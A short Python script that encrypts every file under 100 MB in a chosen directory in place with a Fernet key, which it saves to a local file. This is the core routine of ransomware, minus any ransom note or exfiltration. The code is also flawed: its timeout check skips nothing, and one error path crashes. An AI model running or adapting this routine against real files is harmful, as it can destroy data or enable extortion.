import subprocess
import sys
import os
import time

#install cryptography
subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
from cryptography.fernet import Fernet

# Key generation
key = Fernet.generate_key()

# Store the key in a file
with open("filekey.key", "wb") as filekey:
    filekey.write(key)

# Opening the key
with open("filekey.key", "rb") as filekey:
    key = filekey.read()

# Using the generated key
fernet = Fernet(key)

# Specify the directory to encrypt
directory_to_encrypt = "DIRECTORY TO ENCRYPT"

# Maximum time allowed for each encryption (in seconds)
max_encryption_time = 5

# Encrypt all files in the directory
for filename in os.listdir(directory_to_encrypt):
    filepath = os.path.join(directory_to_encrypt, filename)

    # Skip directories, only process files
    if os.path.isfile(filepath) and (os.path.getsize(filepath) < 100*1024*1024):
        start_time = time.time()

        try:
            with open(filepath, "rb") as file:
                original = file.read()

            # Encrypting the file
            encrypted = fernet.encrypt(original)

            # Opening the file in write mode and writing the encrypted data
            with open(filepath, "wb") as encrypted_file:
                encrypted_file.write(encrypted)

            elapsed_time = time.time() - start_time

            print("Encryption completed for file")

        except Exception as e:
            print("Error processing file")

        if elapsed_time > max_encryption_time:
            print("Skipping file")

print("Encryption completed for all files in the directory.")
